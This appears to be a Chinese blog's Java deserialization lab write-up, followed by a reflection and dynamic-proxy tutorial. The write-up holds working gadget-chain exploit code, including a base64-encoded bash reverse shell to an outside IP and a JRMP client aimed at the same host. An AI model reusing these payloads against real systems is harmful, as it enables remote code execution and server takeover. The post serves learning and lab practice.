class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JrmpListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjID objID = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// 对象标识符</span></span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;82.156.2.166&quot;</span>,<span class="number">2444</span>); <span class="comment">// 与远程的RMI服务连接</span></span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(objID, tcpEndpoint, <span class="keyword">false</span>)); <span class="comment">// \\</span></span><br><span class="line">        RemoteObjectInvocationHandler rih = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        ActivationInstantiator registry = (ActivationInstantiator) Proxy.newProxyInstance(JrmpListener.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;ActivationInstantiator.class&#125;, rih); <span class="comment">// 通过反射</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        os.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        os.writeInt(<span class="number">1896</span>);</span><br><span class="line">        os.writeObject(registry);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for test</span></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(bis);</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vps进行JRMP监听</p>
<p><img src="https://img-blog.csdnimg.cn/664a1fe858284ae3813ded583f9be80c.png" alt="Untitled"></p>
<p>结果：</p>
<p><img src="https://img-blog.csdnimg.cn/c8dd6793a61e40baa1a62c4a4ab66b8c.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/08f88fab5fc748e39acbbd5de83fa43e.png" alt="Untitled"></p>
<h2 id="Lab7-weblogic-UnicastRef"><a href="#Lab7-weblogic-UnicastRef" class="headerlink" title="*Lab7-weblogic-UnicastRef"></a>*Lab7-weblogic-UnicastRef</h2><p>黑名单，又把<code>UnicastRef</code>和<code>RemoteObjectInvocationHandler</code>过滤了，根据前面的payload我们可以知道重要的是我们需要调用到<code>RemoteObject</code>的<code>readObject</code>从而调用到<code>LiveRef</code>实现<code>TCP</code>连接远程的<code>JRMP</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">classBlackList.add(<span class="string">&quot;org.apache.commons.collections.functors&quot;</span>);</span><br><span class="line">classBlackList.add(<span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>);</span><br><span class="line">classBlackList.add(<span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span>);</span><br><span class="line">proxyBlackList.add(<span class="string">&quot;java.rmi.registry&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>找继承<code>RemoteObject</code> 的类，并且大概率是不能使用动态代理了，在测试之后好像并不会影响<code>UnicastRef</code> 的使用。</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">javax.management.remote.rmi.RMIConnectionImpl_Stub</span><br><span class="line">com.sun.jndi.rmi.registry.ReferenceWrapper_Stub</span><br><span class="line">javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">sun.rmi.registry.RegistryImpl_Stub</span><br><span class="line">sun.rmi.transport.DGCImpl_Stub</span><br></pre></td></tr></table></figure>

<p>那重点应该就是找到可利用的类了，但是要注意<code>Dockerfile</code> 中有，对<code>javax.management.BadAttributeValueExpException</code> 进行了序列化过滤</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-Djdk.serialFilter=!javax.management.BadAttributeValueExpException&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/opt/app/lab7-weblogic-UnicastRef.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>但是怎么都绕不过去</p>
<p>麻了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String data = scanner.next();</span><br><span class="line">        <span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">        MyObjectInputStream myObjectInputStream = <span class="keyword">new</span> MyObjectInputStream(inputStream);</span><br><span class="line">        String name = myObjectInputStream.readUTF();</span><br><span class="line">        <span class="keyword">int</span> year = myObjectInputStream.readInt();</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;SJTU&quot;</span>) &amp;&amp; year == <span class="number">1896</span>)</span><br><span class="line">            myObjectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Lab9-proxy"><a href="#Lab9-proxy" class="headerlink" title="Lab9-proxy"></a>Lab9-proxy</h2><p>没有限制的反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicclass IndexController &#123;</span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/basic&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required =true)</span> String data, Model model)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">    InputStream inputStream =<span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">    ObjectInputStream objectInputStream =<span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">    objectInputStream.readObject();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个可序列化的<code>MyInvocationHandler</code> 类，会获取类里面的方法并直接调用，这很显然就可以像JDK7u21的链子一样利用<code>TemplatesImpl</code> ，不过这里在执行的时候需要有两个参数不能利用HashSet了，不然会因为args没有值而导致空指针异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> Class type;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span><span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    Method[] methods =<span class="keyword">this</span>.type.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span> (Method xmethod : methods)</span><br><span class="line">      xmethod.invoke(args[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">returnnull;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以利用<code>PriorityQueue</code></p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.MyInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        MyInvocationHandler handler = <span class="keyword">new</span> MyInvocationHandler();</span><br><span class="line">        setField(handler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Comparator proxy = (Comparator) Proxy.newProxyInstance(Exp.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;templates, <span class="number">1</span>&#125;);</span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;comparator&quot;</span>, proxy);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        System.out.println(bytesTohexString(bos.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesTohexString</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder ret = <span class="keyword">new</span> StringBuilder(<span class="number">2</span> * bytes.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> b = <span class="number">0xF</span> &amp; bytes[i] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">            ret.append(<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class="line">            b = <span class="number">0xF</span> &amp; bytes[i];</span><br><span class="line">            ret.append(<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://img-blog.csdnimg.cn/a1db5abcbe3c42279eb97face0dc2f47.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/0ecc125317234f2eb4ebe12c26b42dc4.png" alt="img"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><del>（学Java真快乐，嘻嘻）</del></p>
<p>lab7等以后学得更透彻了，知道该怎么过了再来补充吧，而lab8的jar包是lab6的，就不多做了</p>
<p>整个过程下来还是学到了很多以前不会的点的，虽然感觉现在web可能越来越卷了，以后应该也遇不到类似的题目，但学到了知识还是挺好的！</p>
<p>（以上题目相关的exp代码都有放到github上，有兴趣的师傅也可以看看<a href="https://github.com/ameuu/javaLearning">https://github.com/ameuu/javaLearning</a></p>
<p>bye！</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://novic4.cn/index.php/archives/26.html#cl-4">JavaDerserializeLabs-writeup - noViC4的笔记本</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/14934168.html">Java JRMP - zpchcbd - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅱ</title>
    <url>/2022/03/29/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A1/</url>
    <content><![CDATA[<blockquote>
<p>Java反射再学习、动态代理（未学透）、CC1……</p>
</blockquote>
<h3 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h3><p><del>上次只是跟着视频打了一遍代码，但是很多都还不懂，所以这次就来仔细认识一下</del></p>
<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">参考</a></p>
<h4 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h4><p>1.Class类</p>
<p>每加载一种<code>class</code>，JVM就会创建一个<code>Class</code>，也就说JVM持有的每个Class实例都指向一个数据类型，而如果在类中有静态初始化器的话，JVM必然会执行该类的静态代码段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><code>Class</code>里面存储着一个<code>class</code>的所有信息，可以直接去Java里面查看一些属性和方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     <span class="comment">//获取String类</span></span><br><span class="line">        Class c = String.class;</span><br><span class="line">        System.out.println(c.getName());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// java.lang.String</span></span><br></pre></td></tr></table></figure>

<p><code>getName</code>|<code>getMethod</code>|<code>getMethods</code>|<code>getClassLoader</code>……</p>
<p><img src="https://img-blog.csdnimg.cn/c71a43b6415a4c6fb7955a96f2cd863b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p><code>getName()</code>获取类名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line">     <span class="comment">//获取String类</span></span><br><span class="line">        <span class="class"><span class="keyword">Class</span> <span class="title">c</span> = <span class="title">String</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="title">c</span>.<span class="title">getName</span>());</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">// <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="title">String</span>[] <span class="title">args</span>) <span class="title">throws</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">Class</span> <span class="title">c</span> = <span class="title">Test</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">s</span> = &quot;&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="title">c</span>.<span class="title">getName</span>());</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">// <span class="title">demo</span>.<span class="title">Test</span></span></span><br></pre></td></tr></table></figure>

<p><code>getMethod(String)</code> 获取其中一个方法</p>
<p><code>getMethods()</code> 返回带有所有方法的数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getMethod(<span class="string">&quot;exp&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// public void demo.Test.exp() throws java.lang.Exception</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getMethods()[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//public void demo.Test.exp() throws java.lang.Exception</span></span><br></pre></td></tr></table></figure>

<p><code>getClass</code> 获取类 | <code>forName</code> 当知道类的全名的时候</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Class c = Test.class;</span><br><span class="line">      System.out.println(c.toString());</span><br><span class="line">     <span class="comment">//class demo.Test</span></span><br><span class="line">      Class c1 = Class.forName(<span class="string">&quot;demo.Test&quot;</span>);</span><br><span class="line">      System.out.println(c1.toString());</span><br><span class="line"><span class="comment">//class demo.Test</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>getModifiers()</code>返回类、属性、方法的修饰符</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>对应的int类型</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>1</td>
</tr>
<tr>
<td>private</td>
<td>2</td>
</tr>
<tr>
<td>protected</td>
<td>4</td>
</tr>
<tr>
<td>static</td>
<td>8</td>
</tr>
<tr>
<td>final</td>
<td>16</td>
</tr>
<tr>
<td>synchronized</td>
<td>32</td>
</tr>
<tr>
<td>volatile</td>
<td>64</td>
</tr>
<tr>
<td>transient</td>
<td>128</td>
</tr>
<tr>
<td>native</td>
<td>256</td>
</tr>
<tr>
<td>interface</td>
<td>512</td>
</tr>
<tr>
<td>abstract</td>
<td>1024</td>
</tr>
<tr>
<td>strict</td>
<td>2048</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getModifiers());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p><code>newInstance()</code>可以实例化类 ，但是只会调用类的无参构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Test t1 = <span class="keyword">new</span> Test();</span><br><span class="line">    Class c = t1.getClass();</span><br><span class="line">    Test test = (Test) c.newInstance();</span><br><span class="line">    test.exp();</span><br><span class="line">    System.out.println(c.newInstance());</span><br><span class="line">    Class c1 = Class.forName(<span class="string">&quot;demo.Test&quot;</span>);</span><br><span class="line">    System.out.println(c1.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getField(String)</code>| <code>getDeclareField(String)</code>|<code>getFields()</code> 获取由public修饰的属性 | <code>getDeclaredFields()</code>获取所有属性</p>
<p><code>getConstructor</code> | <code>getConstructors</code> | <code>getDeclaredConstructor</code> | <code>getDeclaredConstructors</code> 可以利用构造方法进行实例化</p>
<p><img src="https://img-blog.csdnimg.cn/d4b66cc286514ce6b0022cfb7bd9a40e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><h5 id="1-实例化"><a href="#1-实例化" class="headerlink" title="1.实例化"></a>1.实例化</h5><blockquote>
<p>这⾥也需要注意⼀点，在JDK1.9往上，不再使⽤newInstance()。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// forName可操作时</span></span><br><span class="line">Class.forName(<span class="string">&quot;&quot;</span>);</span><br><span class="line">Class.forName(<span class="string">&quot;&quot;</span>).newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 已经存在该对象 但是我们控制不了该对象的时候</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">cl.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用构造方法</span></span><br><span class="line">cl.getConstructor().newInstance();</span><br></pre></td></tr></table></figure>

<h5 id="2-调用方法"><a href="#2-调用方法" class="headerlink" title="2.调用方法"></a>2.调用方法</h5><p><img src="https://img-blog.csdnimg.cn/75b1ce41e97c45faa08ee77d1ad0a1ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无参数</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance());</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/124b138b0c634bf9b799023428971721.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//存在参数</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exp&quot;</span>, String.class);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/228a4100f4834a7cb1e80bc4fbee9c64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h5 id="3-访问私有（属性、方法）"><a href="#3-访问私有（属性、方法）" class="headerlink" title="3.访问私有（属性、方法）"></a>3.访问私有（属性、方法）</h5><p>关键：<code>setAccessible()</code>|<code>getDeclared</code></p>
<p>私有属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Field field = cl.getDeclaredField(<span class="string">&quot;score&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(cl.newInstance(),<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>私有方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getDeclaredMethod(<span class="string">&quot;exp&quot;</span>, String.class);</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="4-命令执行方法"><a href="#4-命令执行方法" class="headerlink" title="4.命令执行方法"></a>4.命令执行方法</h5><p><code>Runtime</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">Method method1 = cl.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object o = method1.invoke(cl);</span><br><span class="line">method.invoke(o, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>ProcessBuilder</code></p>
<p>ProcessBuilder通过实例化的时候传入<code>command</code>调用<code>start</code>方法进行命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">cl.getMethod(<span class="string">&quot;start&quot;</span>).invoke(cl.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br><span class="line"><span class="comment">// 但是要求有Arrays包</span></span><br></pre></td></tr></table></figure>

<p><code>varargs</code>可变长参数，用于当我们想利用ProcessBuilder的另一个构造方法的时候</p>
<p>P神如是说：</p>
<p><img src="https://img-blog.csdnimg.cn/0fd65f86658445dfaa297ba7e51c8069.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));</span><br><span class="line"><span class="comment">// 但是后面的 new String[][]&#123;&#123;&quot;calc&quot;&#125;&#125; 该怎么用反射呢</span></span><br></pre></td></tr></table></figure>

<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="- 动态代理"></a>- 动态代理</h3><p>Java中通常会有静态代理、动态代理和cglib代理</p>
<p><strong>静态代理</strong>就是我们最常用的，利用<code>implements</code>关键字创建实现类实现某一个接口，然后再通过实例化该类从而实现对接口的调用，有时也会通过创建另一个代理类实现对前一个类的调用</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TestIns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">TestIns</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestIns testIns = <span class="keyword">new</span> Test();</span><br><span class="line">        testIns.test();</span><br><span class="line">    &#125;</span><br><span 